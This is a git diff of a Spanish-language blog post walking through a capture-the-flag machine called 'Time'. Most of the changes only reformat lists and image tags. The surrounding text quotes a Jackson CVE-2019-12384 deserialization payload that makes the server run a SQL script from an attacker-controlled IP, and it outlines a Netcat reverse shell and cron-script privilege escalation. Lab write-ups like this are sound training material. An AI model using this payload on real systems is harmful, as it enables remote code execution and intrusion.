@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mi Blog - Post</title>
+    <title>Post - Time</title>
     <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/styles/github.min.css">
     <style>
@@ -72,10 +72,10 @@
 
 Caracteristicas:
 
-Linux
-dificultad media 
-Jackson CVE-2019-12384 Exploitation
-SSRF to RCE Abusing Cron Job [Privilege Escalation]
+- Linux
+- Dificultad media 
+- Jackson CVE-2019-12384 Exploitation
+- SSRF to RCE Abusing Cron Job [Privilege Escalation]
 
 Util para certificaciones eWPT OSWE OSCP
 
@@ -87,7 +87,7 @@ Escaneo de puertos
 
 - nmap -sC -sV -oN time.nmap 10.10.10.214
 
-![Alt Text](/imagenes/time/time.png)
+<img src="imagenes/time/time.png" alt="Texto alternativo" width="500">
 
 Al realizar un escaneo de puertos completo con NMAP, se observan dos puertos abiertos:
 
@@ -100,13 +100,13 @@ Enumeración web
 
 Al acceder a la página web, nos encontramos con un Beautifier y Validador de JSON en línea.
 
-![Alt Text](/imagenes/time/time1.png)
+<img src="imagenes/time/time1.png" alt="Texto alternativo" width="500">
 
 La opción Beautify mejora el código JSON, pero no hay mucho que probar allí.
 Al revisar la opción Validate, notamos que está en versión Beta y al ingresar código JSON, se muestra un error junto con la biblioteca utilizada en la aplicación: com.fasterxml.jackson.databind.
 https://github.com/jas502n/CVE-2019-12384
 
-![Alt Text](/imagenes/time/time2.png)
+<img src="imagenes/time/time2.png" alt="Texto alternativo" width="500">
 
 Después de investigar en Google, descubrimos que esta funcionalidad es vulnerable y tiene una CVE activa (CVE-2019-12384).
 https://github.com/jas502n/CVE-2019-12384
@@ -127,7 +127,7 @@ Debe reemplazar la dirección IP en SHELLEXEC() función en la última línea de
 
 ["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url": "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http:\/\/10.10.14.10:80\/ inyectar.sql'"}] 
 
-![Alt Text](/imagenes/time/time3.png)
+<img src="imagenes/time/time3.png" alt="Texto alternativo" width="500">
 
 también puede usar su forma sin formato para obtener el shell inverso
 
@@ -141,9 +141,11 @@ Iniciar Netcat
 
 whoami && id
 
-![Alt Text](/imagenes/time/time4.png)
 
-![Alt Text](/imagenes/time/time5.png)
+<img src="imagenes/time/time4.png" alt="Texto alternativo" width="500">
+
+<img src="imagenes/time/time5.png" alt="Texto alternativo" width="500">
+
 
 una vez dentro configuramos la consola
 
@@ -159,7 +161,7 @@ buscamos la bandera de usuario
 
 - cat /home/pericles/user.txt
 
-![Alt Text](/imagenes/time/time6.png)
+<img src="imagenes/time/time6.png" alt="Texto alternativo" width="500">
 
 ## Escalada de privilegios 
 
@@ -167,12 +169,12 @@ lanzamos linpeas.sh (un script de enumeración posterior a la explotación). Nos
 Linpeas encontré un guión timer_backup.shdentro del directorio /usr/bin/cual se puede modificar por usuarios normales. 
 fue creado por el usuario con permisos de root, el cual mueve copias de seguridad a la carpeta root.
 
-![Alt Text](/imagenes/time/time8.png)
+<img src="imagenes/time/time8.png" alt="Texto alternativo" width="500">
 
 Al analizar el contenido del script, confirmamos que comprime y mueve el archivo de respaldo a la carpeta root. 
 Además, verificamos los permisos del archivo del script y notamos que pertenece al usuario "pericles" y podemos editarlo.
 
-![Alt Text](/imagenes/time/time11.png)
+<img src="imagenes/time/time11.png" alt="Texto alternativo" width="500">
 
 cuando intenté ejecutar este script me dio permission denied. Una cosa está clara;
 este script sólo puede ser ejecutado por un usuario root. Entonces, si el usuario root 
